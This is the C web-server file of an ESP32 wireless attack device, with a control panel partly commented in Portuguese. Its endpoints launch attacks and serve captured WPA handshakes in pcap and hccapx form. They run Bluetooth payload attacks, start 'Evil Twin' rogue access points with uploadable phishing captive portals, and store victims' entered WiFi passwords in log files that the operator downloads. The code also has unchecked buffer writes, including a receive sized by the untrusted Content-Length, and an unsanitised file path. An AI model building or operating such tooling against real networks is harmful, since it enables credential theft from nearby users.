/**
 * @file webserver.c
 * Serves HTML/CSS/JS/Icons/Fonts directly from SPIFFS filesystem.
 */

#include "webserver.h"

#include <ctype.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_http_server.h"
#include "esp_spiffs.h"
#include "nvs_flash.h"
#include "nvs.h"

#include "attack_deauth_detector.h"
#include "bt_payload_attack.h"
#include "wifi_controller.h"
#include "attack.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"
#include "attack_eviltwin.h"

static const char *TAG = "webserver";
ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);

#define PORTAL_ACTIVE_PATH  "/spiffs/devil_twin/index.html"
#define PORTAL_TMP_PATH     "/spiffs/devil_twin/index.upload.tmp"
#define PORTAL_DEFAULT_PATH "/spiffs/devil_twin/index.default.html"
#define PORTAL_MAX_BYTES    (102400)   /* 100 KB hard ceiling */

static httpd_handle_t server = NULL;
static bool spiffs_mounted   = false;

static void url_decode(char *dst, const char *src);



static void init_spiffs(void) {
    if (spiffs_mounted) return;
    esp_vfs_spiffs_conf_t conf = {
        .base_path              = "/spiffs",
        .partition_label        = "storage",
        .max_files              = 10,
        .format_if_mount_failed = false
    };
    esp_err_t ret = esp_vfs_spiffs_register(&conf);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "SPIFFS mount failed: %s", esp_err_to_name(ret));
        return;
    }
    spiffs_mounted = true;
    size_t total = 0, used = 0;
    esp_spiffs_info("storage", &total, &used);
    ESP_LOGI(TAG, "SPIFFS: %d/%d bytes used", used, total);
}


/* ───────────────────────────── File serving ─────────────────────────────── */

static esp_err_t serve_file(httpd_req_t *req, const char *filepath) {
    struct stat st;
    if (stat(filepath, &st) == -1) {
        ESP_LOGE(TAG, "File not found: %s", filepath);
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "File not found");
        return ESP_FAIL;
    }

    FILE *f = fopen(filepath, "r");
    if (f == NULL) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to open file");
        return ESP_FAIL;
    }

    if      (strstr(filepath, ".html")) httpd_resp_set_type(req, "text/html");
    else if (strstr(filepath, ".css"))  httpd_resp_set_type(req, "text/css");
    else if (strstr(filepath, ".js"))   httpd_resp_set_type(req, "application/javascript");
    else if (strstr(filepath, ".png"))  httpd_resp_set_type(req, "image/png");
    else if (strstr(filepath, ".jpg") || strstr(filepath, ".jpeg"))
        httpd_resp_set_type(req, "image/jpeg");
    else if (strstr(filepath, ".woff2")) httpd_resp_set_type(req, "font/woff2");
    else if (strstr(filepath, ".woff"))  httpd_resp_set_type(req, "font/woff");
    else if (strstr(filepath, ".ttf"))   httpd_resp_set_type(req, "font/ttf");
    else if (strstr(filepath, ".pcap")) httpd_resp_set_type(req, "application/octet-stream");
    else if (strstr(filepath, ".txt"))  httpd_resp_set_type(req, "text/plain");
    else                                httpd_resp_set_type(req, "text/plain");

    char buf[1024];
    size_t bytes_read;
    while ((bytes_read = fread(buf, 1, sizeof(buf), f)) > 0) {
        if (httpd_resp_send_chunk(req, buf, bytes_read) != ESP_OK) {
            fclose(f);
            return ESP_FAIL;
        }
    }

    fclose(f);
    return httpd_resp_send_chunk(req, NULL, 0);
}


static esp_err_t common_get_handler(httpd_req_t *req) {
    char filepath[256];
    const char *prefix = "/spiffs";

    if (strlen(req->uri) >= (sizeof(filepath) - strlen(prefix) - 1)) {
        ESP_LOGE(TAG, "URI too long: %s", req->uri);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "URI too long");
        return ESP_FAIL;
    }

    strcpy(filepath, prefix);
    strcat(filepath, req->uri);
    return serve_file(req, filepath);
}


/* ───────────────────────────── GET handlers ─────────────────────────────── */

static esp_err_t uri_root_get_handler(httpd_req_t *req) {
    return serve_file(req, "/spiffs/index.html");
}

static esp_err_t uri_ap_list_get_handler(httpd_req_t *req) {
    wifictl_scan_nearby_aps();
    const wifictl_ap_records_t *ap_records = wifictl_get_ap_records();

    char resp_chunk[40];
    httpd_resp_set_type(req, HTTPD_TYPE_OCTET);
    for (unsigned i = 0; i < ap_records->count; i++) {
        memcpy(resp_chunk,      ap_records->records[i].ssid,  33);
        memcpy(&resp_chunk[33], ap_records->records[i].bssid,  6);
        memcpy(&resp_chunk[39], &ap_records->records[i].rssi,  1);
        httpd_resp_send_chunk(req, resp_chunk, 40);
    }
    return httpd_resp_send_chunk(req, NULL, 0);
}

static esp_err_t uri_status_get_handler(httpd_req_t *req) {
    const attack_status_t *attack_status = attack_get_status();
    httpd_resp_set_type(req, HTTPD_TYPE_OCTET);
    httpd_resp_send_chunk(req, (char *)attack_status, 4);
    if ((attack_status->state == FINISHED || attack_status->state == TIMEOUT)
        && attack_status->content_size > 0) {
        httpd_resp_send_chunk(req, attack_status->content, attack_status->content_size);
        }
        return httpd_resp_send_chunk(req, NULL, 0);
}

static esp_err_t uri_capture_pcap_get_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, HTTPD_TYPE_OCTET);
    return httpd_resp_send(req, (char *)pcap_serializer_get_buffer(), pcap_serializer_get_size());
}

static esp_err_t uri_capture_hccapx_get_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "application/octet-stream");
    httpd_resp_set_hdr(req, "Content-Disposition", "attachment; filename=hydra_capture.hccapx");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store, no-cache, must-revalidate");
    return httpd_resp_send(req, (char *)hccapx_serializer_get(), sizeof(hccapx_t));
}

static esp_err_t uri_bt_status_handler(httpd_req_t *req) {
    char json[256];
    snprintf(json, sizeof(json),
             "{\"connected\":%s,\"busy\":%s,\"name\":\"%s\",\"mac\":\"%s\"}",
             bt_payload_is_connected() ? "true" : "false",
             bt_payload_is_busy()      ? "true" : "false",
             bt_payload_get_connected_name(),
             bt_payload_get_connected_mac());
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, strlen(json));
}

static esp_err_t uri_download_pass_get_handler(httpd_req_t *req) {
    return serve_file(req, "/spiffs/passwords.txt");
}

/* Persistent Evil Twin capture log (uptime|ssid|bssid|username|password|status). */
static esp_err_t uri_eviltwin_log_get_handler(httpd_req_t *req) {
    return serve_file(req, "/spiffs/eviltwin_log.txt");
}

static esp_err_t uri_get_log_url_handler(httpd_req_t *req) {
    char url[256] = "http://192.168.4.1/log";
    nvs_handle_t nvs;
    if (nvs_open("storage", NVS_READONLY, &nvs) == ESP_OK) {
        size_t len = sizeof(url);
        nvs_get_str(nvs, "log_url", url, &len);
        nvs_close(nvs);
    }
    httpd_resp_set_type(req, "application/json");
    char response[300];
    snprintf(response, sizeof(response), "{\"url\":\"%s\"}", url);
    return httpd_resp_send(req, response, strlen(response));
}

static esp_err_t uri_detector_status_handler(httpd_req_t *req) {
    const deauth_detector_status_t *s = deauth_detector_get_status();
    httpd_resp_set_type(req, "application/json");

    char json[1024] = "{\"running\":";
    strcat(json, s->running ? "true" : "false");
    strcat(json, ",\"alerts\":[");

    bool first = true;
    for (int i = 0; i < s->count; i++) {
        if (!s->entries[i].alerting) continue;
        if (!first) strcat(json, ",");
        first = false;
        char entry[128];
        snprintf(entry, sizeof(entry),
                 "{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"count\":%d}",
                 s->entries[i].bssid[0], s->entries[i].bssid[1],
                 s->entries[i].bssid[2], s->entries[i].bssid[3],
                 s->entries[i].bssid[4], s->entries[i].bssid[5],
                 s->entries[i].count);
        strcat(json, entry);
    }
    strcat(json, "]}");
    return httpd_resp_send(req, json, strlen(json));
}

static esp_err_t uri_evil_twin_status_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "application/json");
    const char *password    = get_evil_twin_password();
    int wrong_attempts      = get_wrong_attempts_count();
    char json[1024];

    if (password != NULL) {
        snprintf(json, sizeof(json),
                 "{\"status\":\"SUCCESS\",\"password\":\"%s\",\"wrong_attempts\":%d}",
                 password, wrong_attempts);
    } else if (is_evil_twin_active()) {
        char wrong_pwds[512];
        get_wrong_passwords(wrong_pwds, sizeof(wrong_pwds));
        snprintf(json, sizeof(json),
                 "{\"status\":\"RUNNING\",\"wrong_attempts\":%d,\"wrong_passwords\":\"%s\"}",
                 wrong_attempts, wrong_pwds);
    } else {
        snprintf(json, sizeof(json),
                 "{\"status\":\"STOPPED\",\"wrong_attempts\":%d}", wrong_attempts);
    }
    return httpd_resp_send(req, json, strlen(json));
}

/** @brief Informa se o captive portal ativo é o padrão ou um personalizado. */
static esp_err_t uri_portal_state_handler(httpd_req_t *req) {
    uint8_t custom = 0;
    nvs_handle_t nvs;
    if (nvs_open("storage", NVS_READONLY, &nvs) == ESP_OK) {
        nvs_get_u8(nvs, "portal_custom", &custom);   /* se não existir, custom fica 0 */
        nvs_close(nvs);
    }
    char json[48];
    snprintf(json, sizeof(json), "{\"custom\":%s}", custom ? "true" : "false");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, strlen(json));
}


/* ─────────────────────────── HEAD handlers ──────────────────────────────── */

static esp_err_t uri_reset_head_handler(httpd_req_t *req) {
    ESP_ERROR_CHECK(esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_RESET,
                                   NULL, 0, portMAX_DELAY));
    return httpd_resp_send(req, NULL, 0);
}


/* ───────────────────────────── POST handlers ────────────────────────────── */

static esp_err_t uri_run_attack_post_handler(httpd_req_t *req) {
    attack_request_t attack_request;
    int received = httpd_req_recv(req, (char *)&attack_request, sizeof(attack_request_t));
    if (received != sizeof(attack_request_t)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad payload");
        return ESP_FAIL;
    }
    esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_REQUEST,
                   &attack_request, sizeof(attack_request_t), portMAX_DELAY);
    return httpd_resp_send(req, NULL, 0);
}

static esp_err_t uri_bt_payload_set_handler(httpd_req_t *req) {
    char buf[16];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) return ESP_FAIL;
    buf[ret] = '\0';

    int payload = atoi(buf);
    if (payload < 1 || payload > 5) payload = 1;
    bt_payload_attack_set_payload(payload);
    return httpd_resp_sendstr(req, "OK");
}

static esp_err_t uri_bt_payload_run_handler(httpd_req_t *req) {
    bt_payload_attack_run_now();
    return httpd_resp_sendstr(req, "OK");
}

static esp_err_t uri_log_post_handler(httpd_req_t *req) {
    char buf[2048];
    int ret = httpd_req_recv(req, buf, req->content_len);
    if (ret <= 0) return ESP_FAIL;
    buf[ret] = '\0';

    FILE *f = fopen("/spiffs/passwords.txt", "w");
    if (f == NULL) return ESP_FAIL;
    fprintf(f, "%s", buf);
    fclose(f);
    return httpd_resp_sendstr(req, "Logged");
}

/**
 * @brief Recebe um HTML de captive portal personalizado e o instala de forma atômica.
 *
 * Segurança:
 *  - Rejeita Content-Length > PORTAL_MAX_BYTES (100 KB) antes de ler o corpo.
 *  - Rejeita se o SPIFFS não tiver espaço livre suficiente (HTTP 507).
 *  - Grava num arquivo temporário; só faz rename() por cima do ativo se o total
 *    recebido bater com o Content-Length. Se algo falhar, o portal ativo antigo
 *    permanece intacto (o .tmp órfão é removido).
 */
static esp_err_t uri_portal_upload_handler(httpd_req_t *req) {
    int total = req->content_len;

    if (total <= 0 || total > PORTAL_MAX_BYTES) {
        ESP_LOGW(TAG, "Portal upload rejected: size %d (max %d)", total, PORTAL_MAX_BYTES);
        httpd_resp_set_status(req, "413 Payload Too Large");
        httpd_resp_sendstr(req, "File exceeds 100 KB limit.");
        return ESP_FAIL;
    }

    /* Checagem de espaço livre real no SPIFFS (com margem de segurança). */
    size_t fs_total = 0, fs_used = 0;
    if (esp_spiffs_info("storage", &fs_total, &fs_used) == ESP_OK) {
        size_t free_bytes = (fs_total > fs_used) ? (fs_total - fs_used) : 0;
        /* Precisamos de espaço para o .tmp coexistir com o ativo atual + folga. */
        if (free_bytes < (size_t)total + 8192) {
            ESP_LOGE(TAG, "Portal upload: insufficient SPIFFS space (free=%u need=%d)",
                     (unsigned)free_bytes, total + 8192);
            httpd_resp_set_status(req, "507 Insufficient Storage");
            httpd_resp_sendstr(req, "Not enough space on device.");
            return ESP_FAIL;
        }
    }

    FILE *f = fopen(PORTAL_TMP_PATH, "w");
    if (f == NULL) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Cannot open temp file");
        return ESP_FAIL;
    }

    char buf[1024];
    int remaining = total;
    while (remaining > 0) {
        int to_read = (remaining < (int)sizeof(buf)) ? remaining : (int)sizeof(buf);
        int r = httpd_req_recv(req, buf, to_read);
        if (r <= 0) {
            if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
            fclose(f);
            unlink(PORTAL_TMP_PATH);
            ESP_LOGE(TAG, "Portal upload: recv error, aborting");
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Receive error");
            return ESP_FAIL;
        }
        if (fwrite(buf, 1, r, f) != (size_t)r) {
            fclose(f);
            unlink(PORTAL_TMP_PATH);
            ESP_LOGE(TAG, "Portal upload: write error (disk full?), aborting");
            httpd_resp_set_status(req, "507 Insufficient Storage");
            httpd_resp_sendstr(req, "Write failed (disk full).");
            return ESP_FAIL;
        }
        remaining -= r;
    }
    fclose(f);

    /* Install the new page. SPIFFS rename() FAILS if the destination already
     * exists (SPIFFS_ERR_CONFLICTING_NAME), and the active page always exists,
     * so the old file must be removed first. The tmp file is already fully
     * written and closed; if power is lost in the tiny window between remove and
     * rename, "Restore Default" rebuilds index.html from index.default.html. */
    remove(PORTAL_ACTIVE_PATH);
    if (rename(PORTAL_TMP_PATH, PORTAL_ACTIVE_PATH) != 0) {
        unlink(PORTAL_TMP_PATH);
        ESP_LOGE(TAG, "Portal upload: rename() failed");
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Install failed");
        return ESP_FAIL;
    }

    /* Marca estado = personalizado na NVS. */
    nvs_handle_t nvs;
    if (nvs_open("storage", NVS_READWRITE, &nvs) == ESP_OK) {
        nvs_set_u8(nvs, "portal_custom", 1);
        nvs_commit(nvs);
        nvs_close(nvs);
    }

    ESP_LOGI(TAG, "Custom captive portal installed (%d bytes)", total);
    return httpd_resp_sendstr(req, "OK");
}

/** @brief Restaura o captive portal de fábrica copiando index.default.html sobre o ativo. */
static esp_err_t uri_portal_restore_handler(httpd_req_t *req) {
    FILE *src = fopen(PORTAL_DEFAULT_PATH, "r");
    if (src == NULL) {
        ESP_LOGE(TAG, "Restore: default portal file missing");
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Default file missing");
        return ESP_FAIL;
    }
    FILE *dst = fopen(PORTAL_ACTIVE_PATH, "w");
    if (dst == NULL) {
        fclose(src);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Cannot write active file");
        return ESP_FAIL;
    }

    char buf[1024];
    size_t n;
    bool ok = true;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
        if (fwrite(buf, 1, n, dst) != n) { ok = false; break; }
    }
    fclose(src);
    fclose(dst);

    if (!ok) {
        ESP_LOGE(TAG, "Restore: copy failed");
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Copy failed");
        return ESP_FAIL;
    }

    nvs_handle_t nvs;
    if (nvs_open("storage", NVS_READWRITE, &nvs) == ESP_OK) {
        nvs_set_u8(nvs, "portal_custom", 0);
        nvs_commit(nvs);
        nvs_close(nvs);
    }

    ESP_LOGI(TAG, "Captive portal restored to factory default");
    return httpd_resp_sendstr(req, "OK");
}

static esp_err_t uri_set_log_url_handler(httpd_req_t *req) {
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) return ESP_FAIL;
    buf[ret] = '\0';

    nvs_handle_t nvs;
    if (nvs_open("storage", NVS_READWRITE, &nvs) == ESP_OK) {
        nvs_set_str(nvs, "log_url", buf);
        nvs_commit(nvs);
        nvs_close(nvs);
    }
    return httpd_resp_sendstr(req, "OK");
}

/** @brief Clears the persistent Evil Twin capture log. */
static esp_err_t uri_eviltwin_log_clear_handler(httpd_req_t *req) {
    remove("/spiffs/eviltwin_log.txt");
    return httpd_resp_sendstr(req, "OK");
}

/**
 * @brief Launches a custom-name (rogue AP) Evil Twin. Body: ssid=<name>.
 *        The response is sent before the attack starts because starting it takes
 *        down the management AP (the operator's browser will disconnect).
 */
static esp_err_t uri_custom_evil_twin_handler(httpd_req_t *req) {
    char buf[128];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) return ESP_FAIL;
    buf[ret] = '\0';

    char raw_ssid[96] = {0}, ssid[33] = {0};
    if (httpd_query_key_value(buf, "ssid", raw_ssid, sizeof(raw_ssid)) != ESP_OK) {
        return httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid");
    }
    url_decode(ssid, raw_ssid);
    ssid[32] = '\0';
    if (ssid[0] == '\0') {
        return httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Empty ssid");
    }

    ESP_LOGI(TAG, "Launching custom rogue Evil Twin: '%s'", ssid);
    httpd_resp_sendstr(req, "OK");           /* reply before the mgmt AP goes down */
    vTaskDelay(pdMS_TO_TICKS(200));
    attack_method_evil_twin_custom(ssid);
    return ESP_OK;
}

static esp_err_t uri_detector_start_handler(httpd_req_t *req) {
    deauth_detector_start();
    return httpd_resp_send(req, "OK", 2);
}

static esp_err_t uri_detector_stop_handler(httpd_req_t *req) {
    deauth_detector_stop();
    return httpd_resp_send(req, "OK", 2);
}

static esp_err_t save_settings_post_handler(httpd_req_t *req) {
    char buf[128];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) return ESP_FAIL;
    buf[ret] = '\0';

    char raw_ssid[64] = {0}, raw_pass[96] = {0};
    char ssid[33] = {0}, pass[65] = {0};

    if (httpd_query_key_value(buf, "ssid", raw_ssid, sizeof(raw_ssid)) != ESP_OK ||
        httpd_query_key_value(buf, "pass", raw_pass, sizeof(raw_pass)) != ESP_OK) {
        return httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid data");
        }

        url_decode(ssid, raw_ssid);
    url_decode(pass, raw_pass);
    ssid[32] = '\0';
    pass[64] = '\0';

    ESP_LOGI(TAG, "Updating Management AP: SSID=%s", ssid);

    nvs_handle_t nvs_h;
    if (nvs_open("storage", NVS_READWRITE, &nvs_h) == ESP_OK) {
        nvs_set_str(nvs_h, "ap_ssid", ssid);
        nvs_set_str(nvs_h, "ap_pass", pass);
        nvs_commit(nvs_h);
        nvs_close(nvs_h);
    }
    httpd_resp_sendstr(req, "Settings Saved! Rebooting...");
    vTaskDelay(pdMS_TO_TICKS(1000));
    esp_restart();
    return ESP_OK;
}


/* ─────────────────────────── URI table ──────────────────────────────────── */

static httpd_uri_t uri_root          = { .uri = "/",                 .method = HTTP_GET,  .handler = uri_root_get_handler };
static httpd_uri_t uri_ap_list       = { .uri = "/ap-list",          .method = HTTP_GET,  .handler = uri_ap_list_get_handler };
static httpd_uri_t uri_status        = { .uri = "/status",           .method = HTTP_GET,  .handler = uri_status_get_handler };
static httpd_uri_t uri_capture_pcap  = { .uri = "/capture.pcap",     .method = HTTP_GET,  .handler = uri_capture_pcap_get_handler };
static httpd_uri_t uri_hccapx        = { .uri = "/capture.hccapx",   .method = HTTP_GET,  .handler = uri_capture_hccapx_get_handler };
static httpd_uri_t uri_bt_status_get = { .uri = "/bt-status",        .method = HTTP_GET,  .handler = uri_bt_status_handler };
static httpd_uri_t uri_download_pass = { .uri = "/download-pass",    .method = HTTP_GET,  .handler = uri_download_pass_get_handler };
static httpd_uri_t uri_get_log_url   = { .uri = "/get-log-url",      .method = HTTP_GET,  .handler = uri_get_log_url_handler };
static httpd_uri_t uri_det_status    = { .uri = "/detector/status",  .method = HTTP_GET,  .handler = uri_detector_status_handler };
static httpd_uri_t uri_evil_status   = { .uri = "/evil-twin-status", .method = HTTP_GET,  .handler = uri_evil_twin_status_handler };
static httpd_uri_t uri_portal_state  = { .uri = "/devil_twin/portal-state", .method = HTTP_GET, .handler = uri_portal_state_handler };
static httpd_uri_t uri_eviltwin_log  = { .uri = "/eviltwin-log",     .method = HTTP_GET,  .handler = uri_eviltwin_log_get_handler };


static httpd_uri_t uri_icons  = { .uri = "/icons/*",      .method = HTTP_GET, .handler = common_get_handler };
static httpd_uri_t uri_fonts  = { .uri = "/fonts/*",      .method = HTTP_GET, .handler = common_get_handler };
static httpd_uri_t uri_dtwin  = { .uri = "/devil_twin/*", .method = HTTP_GET, .handler = common_get_handler };
static httpd_uri_t uri_style  = { .uri = "/style.css",    .method = HTTP_GET, .handler = common_get_handler };
static httpd_uri_t uri_js     = { .uri = "/app.js",       .method = HTTP_GET, .handler = common_get_handler };


static httpd_uri_t uri_reset  = { .uri = "/reset",        .method = HTTP_HEAD, .handler = uri_reset_head_handler };

/* POST */
static httpd_uri_t uri_run_attack    = { .uri = "/run-attack",       .method = HTTP_POST, .handler = uri_run_attack_post_handler };
static httpd_uri_t uri_bt_payload_s  = { .uri = "/bt-payload-set",   .method = HTTP_POST, .handler = uri_bt_payload_set_handler };
static httpd_uri_t uri_bt_payload_r  = { .uri = "/bt-payload-run",   .method = HTTP_POST, .handler = uri_bt_payload_run_handler };
static httpd_uri_t uri_log_post      = { .uri = "/log",              .method = HTTP_POST, .handler = uri_log_post_handler };
static httpd_uri_t uri_set_log_url   = { .uri = "/set-log-url",      .method = HTTP_POST, .handler = uri_set_log_url_handler };
static httpd_uri_t uri_det_start     = { .uri = "/detector/start",   .method = HTTP_POST, .handler = uri_detector_start_handler };
static httpd_uri_t uri_det_stop      = { .uri = "/detector/stop",    .method = HTTP_POST, .handler = uri_detector_stop_handler };
static httpd_uri_t uri_save_settings = { .uri = "/save_settings",    .method = HTTP_POST, .handler = save_settings_post_handler };
static httpd_uri_t uri_portal_upload  = { .uri = "/devil_twin/upload",          .method = HTTP_POST, .handler = uri_portal_upload_handler };
static httpd_uri_t uri_portal_restore = { .uri = "/devil_twin/restore-default", .method = HTTP_POST, .handler = uri_portal_restore_handler };
static httpd_uri_t uri_eviltwin_log_clear = { .uri = "/eviltwin-log/clear", .method = HTTP_POST, .handler = uri_eviltwin_log_clear_handler };
static httpd_uri_t uri_custom_evil_twin   = { .uri = "/custom-evil-twin",   .method = HTTP_POST, .handler = uri_custom_evil_twin_handler };


/* ─────────────────────────── Public API ─────────────────────────────────── */

void webserver_stop(void) {
    if (server == NULL) {
        ESP_LOGW(TAG, "Webserver not running.");
        return;
    }
    if (httpd_stop(server) == ESP_OK) {
        server = NULL;
        ESP_LOGI(TAG, "Webserver stopped.");
    } else {
        ESP_LOGE(TAG, "Failed to stop webserver!");
    }
}

void webserver_run(void) {
    if (server != NULL) return;
    init_spiffs();

    httpd_config_t config     = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers   = 34;
    config.uri_match_fn       = httpd_uri_match_wildcard;

    if (httpd_start(&server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start webserver!");
        return;
    }


    httpd_register_uri_handler(server, &uri_root);
    httpd_register_uri_handler(server, &uri_ap_list);
    httpd_register_uri_handler(server, &uri_status);
    httpd_register_uri_handler(server, &uri_capture_pcap);
    httpd_register_uri_handler(server, &uri_hccapx);
    httpd_register_uri_handler(server, &uri_bt_status_get);
    httpd_register_uri_handler(server, &uri_download_pass);
    httpd_register_uri_handler(server, &uri_get_log_url);
    httpd_register_uri_handler(server, &uri_det_status);
    httpd_register_uri_handler(server, &uri_evil_status);


    httpd_register_uri_handler(server, &uri_portal_state);   /* GET — antes do curinga devil_twin */
    httpd_register_uri_handler(server, &uri_eviltwin_log);

    httpd_register_uri_handler(server, &uri_icons);
    httpd_register_uri_handler(server, &uri_fonts);
    httpd_register_uri_handler(server, &uri_dtwin);
    httpd_register_uri_handler(server, &uri_style);
    httpd_register_uri_handler(server, &uri_js);


    httpd_register_uri_handler(server, &uri_reset);


    httpd_register_uri_handler(server, &uri_run_attack);
    httpd_register_uri_handler(server, &uri_bt_payload_s);
    httpd_register_uri_handler(server, &uri_bt_payload_r);
    httpd_register_uri_handler(server, &uri_log_post);
    httpd_register_uri_handler(server, &uri_set_log_url);
    httpd_register_uri_handler(server, &uri_det_start);
    httpd_register_uri_handler(server, &uri_det_stop);
    httpd_register_uri_handler(server, &uri_save_settings);
    httpd_register_uri_handler(server, &uri_portal_upload);
    httpd_register_uri_handler(server, &uri_portal_restore);
    httpd_register_uri_handler(server, &uri_eviltwin_log_clear);
    httpd_register_uri_handler(server, &uri_custom_evil_twin);

    ESP_LOGI(TAG, "Webserver started — %d handlers registered.", 30);
}


/* ─────────────────────────── URL decode ─────────────────────────────────── */

static void url_decode(char *dst, const char *src) {
    char a, b;
    while (*src) {
        if ((*src == '%') &&
            ((a = src[1]) && (b = src[2])) &&
            isxdigit((unsigned char)a) &&
            isxdigit((unsigned char)b)) {

            if (a >= 'a') a -= 32;
            a = (a >= 'A') ? a - 'A' + 10 : a - '0';

            if (b >= 'a') b -= 32;
            b = (b >= 'A') ? b - 'A' + 10 : b - '0';

            *dst++ = 16 * a + b;
            src += 3;
            } else if (*src == '+') {
                *dst++ = ' ';
                src++;
            } else {
                *dst++ = *src++;
            }
    }
    *dst = '\0';
}
